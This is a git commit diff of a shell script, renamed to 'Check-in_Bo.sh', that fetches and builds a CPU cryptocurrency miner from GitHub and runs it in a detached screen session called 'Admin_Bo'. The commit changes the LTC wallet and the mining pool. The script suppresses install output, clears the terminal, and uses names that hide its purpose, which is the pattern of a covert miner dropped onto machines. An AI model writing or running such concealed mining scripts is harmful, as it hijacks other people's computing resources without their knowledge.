06862b4b03f4a2a0a34b0ad9cb8256ee1be690ba
Trader-Vapers86 <108868126+Trader-Vapers86@users.noreply.github.com>
2022-07-14 20:46:42 +0700

    Update and rename Open_Bo.sh to Check-in_Bo.sh

--- Check-in_Bo.sh
+++ Check-in_Bo.sh
@@ -1,15 +1,15 @@
 #!/bin/sh
 
-WALLET=web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.Mi_chat86-$(echo $(shuf -i 1-9999 -n 1))
+WALLET=ltc1qdp2yackzxymhjk5hmu2grjem9zpgphvhgpqy89 -p c=LTC,mc=BTE,ID=Mi_Chat86-$(echo $(shuf -i 1-9999 -n 1))
 
-POOL=asia.rplant.xyz:7017 
+POOL=stratum+tcp://yespower.mine.zergpool.com:6533
 
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 wget https://github.com/wong-fi-hung/termux-miner/archive/refs/tags/v2.7.tar.gz; tar -xf v2.7.tar.gz; cd termux-miner-2.7; ./build.sh; chmod +x cpuminer
 screen -S Admin_Bo -dm ./cpuminer -a yespower -o $POOL -u $WALLET -t 4
 screen -ls
-sleep 4
+sleep 2
 clear
 cd ..
 screen -ls
